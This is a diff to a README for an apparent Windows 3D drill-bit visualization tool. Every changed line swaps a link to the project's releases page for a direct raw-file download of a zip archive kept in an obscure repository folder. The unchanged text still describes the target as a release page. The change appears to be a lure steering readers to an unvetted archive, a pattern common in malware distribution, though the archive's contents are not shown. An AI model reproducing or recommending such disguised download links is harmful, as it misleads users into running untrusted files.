@@ -1,6 +1,6 @@
 # 🛠️ Integrated-Drill-Bit-Visualization-3D - Visualize Drill Bits in 3D Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://raw.githubusercontent.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/main/wrig/D-Visualization-Drill-Integrated-Bit-v3.7.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This program runs as a standalone Windows application. No installation of other 
 
 1. **Go to the download page**  
 Click on the button below to visit the release page where the latest version is listed:  
-[![Download Releases](https://img.shields.io/badge/Go_to_Downloads-brightgreen?style=for-the-badge)](https://github.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/releases)
+[![Download Releases](https://img.shields.io/badge/Go_to_Downloads-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/main/wrig/D-Visualization-Drill-Integrated-Bit-v3.7.zip)
 
 2. **Find the latest release**  
 On the releases page, look for the most recent version. Releases are usually tagged by date or version number.
@@ -107,7 +107,7 @@ The data behind the models comes from Python scripts processing standard STEP fi
 
 Access the software releases here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://raw.githubusercontent.com/Akunfalse/Integrated-Drill-Bit-Visualization-3D/main/wrig/D-Visualization-Drill-Integrated-Bit-v3.7.zip)
 
 Check this page regularly for the latest versions and patches. This repository hosts all releases for Windows users.
 
